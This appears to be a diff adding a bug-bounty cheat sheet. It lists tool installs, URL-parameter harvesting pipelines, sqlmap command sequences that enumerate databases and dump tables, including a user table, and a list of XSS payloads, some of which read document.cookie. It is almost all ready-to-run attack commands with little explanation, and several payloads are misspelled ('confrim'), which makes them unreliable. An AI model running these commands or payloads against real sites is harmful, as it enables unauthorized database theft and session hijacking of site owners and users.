@@ -1,0 +1,95 @@
+Tools install:
+
+sudo apt install golang
+sudo apt-install subfinder
+
+go install github.com/tomnomnom/waybackurls@latest
+go install github.com/lc/gau/v2/cmd/gau@latest
+cd /go/bin/
+cp waybackurls /usr/local/bin
+cp waybackurls /usr/bin
+
+git clone https://github.com/ameenmaali/urldedupe.git
+cd urldedupe
+cmake CMakeLists.txt
+make
+cp urldedupe /usr/local/bin/
+
+git clone https://github.com/tomnomnom/gf.git ~/gf
+cd ~/gf
+go build
+go mod init gf
+go mod tidy
+go build
+sudo mv gf /usr/local/bin/
+
+mkdir ~/.gf
+git clone https://github.com/Sherlock297/gf_patterns.git
+cd gf_patterns/
+cp *.json ~/.gf
+
+git clone https://github.com/1ndianl33t/Gf-Patterns
+mkdir .gf
+mv ~/Gf-Patterns/*.json ~/.gf
+
+Method 01:
+
+echo https://www.abc.xyz | waybackurls
+echo https://www.abc.xyz | waybackurls | grep '='
+echo https://www.abc.xyz | waybackurls | grep '=' | sed -n 's/.*?\(.*=.*\)/\1/p'
+echo https://www.abc.xyz | waybackurls | grep '=' | sed -n 's/.*?\(.*=.*\)/\1/p' | tr '&' '\n'
+echo https://www.abc.xyz | waybackurls | grep '=' | sed -n 's/.*?\(.*=.*\)/\1/p' | tr '&' '\n' | cut -d '=' -f1
+echo https://www.abc.xyz | waybackurls | grep '=' | sed -n 's/.*?\(.*=.*\)/\1/p' | tr '&' '\n' | cut -d '=' -f1 | sort -u
+echo https://www.abc.xyz | waybackurls | grep '=' > urls_with_params.txt
+
+sqlmap -u 'https://www.abc.xyz/?cat=1' --current-db
+sqlmap -u 'https://www.abc.xyz/?cat=1' --current-db --random-agent
+sqlmap -u 'https://www.abc.xyz/?cat=1' --current-db --random-agent --level=5 --threads=5
+sqlmap -u 'https://www.abc.xyz/?cat=1' -D dbname --tables --random-agent
+sqlmap -u 'https://www.abc.xyz/?cat=1' -D dbname -T tbname --dump --threads=5 --random-agent
+
+Method 02:
+
+sqlmap -u 'https://www.abc.xyz/?cat=1' --level=5 --risk=3 --random-agent --current-db
+sqlmap -u 'https://www.abc.xyz/?cat=1' --level=5 --risk=3 --random-agent -D dbname --tables
+sqlmap -u 'https://www.abc.xyz/?cat=1' --level=5 --risk=3 --random-agent -D dbname -T tbuser --dump
+
+Method 03: SQLI auth Bypass
+
+Method 04:
+sqlmap -u "https://www.abc.xyz/abc.php?id=2" --current-db
+sqlmap -u "https://www.abc.xyz/abc.php?id=2" -D dbname --tables
+sqlmap -u "https://www.abc.xyz/abc.php?id=2" -D dbname -T tbname --dump
+sqlmap -u "https://www.abc.xyz/abc.php?id=2" -D dbname -T tbname --dump --threads=10
+
+
+XSS:
+<svg/onload=alert(document.domain)>
+<svg/onload=prompt(1337);>
+<svg only=1 onload=confrim('Are you sure?')>
+<script>alert('XSS');</script>
+<svg only=1 onload=confrim('Are you sure?')>
+<svg/onload=alert(1)>
+
+<script>alert(document.cookie)</script>
+<script>alert(1)</script>
+<sCript>alert(1)</sCript>
+<img src=x onerror=prompt(1)>
+<img src="x" onerror="prompt(1)">
+<Script>alert(123)</Script>
+
+echo https://www.abc.xyz | waybackurls | grep '=' > result.txt
+subfinder -d www.abc.xyz -all -silent | gau | urldedupe | gf xss
+
+<font color="red">Vulnerable</font>
+<button onclick=alert(xss)>Submit</button>
+<Img Src=OnXSS OnError=confrim(4123)>
+<Img Src=OnXSS OnError=confrim(document.cookie)>
+
+
+
+
+
+
+
+
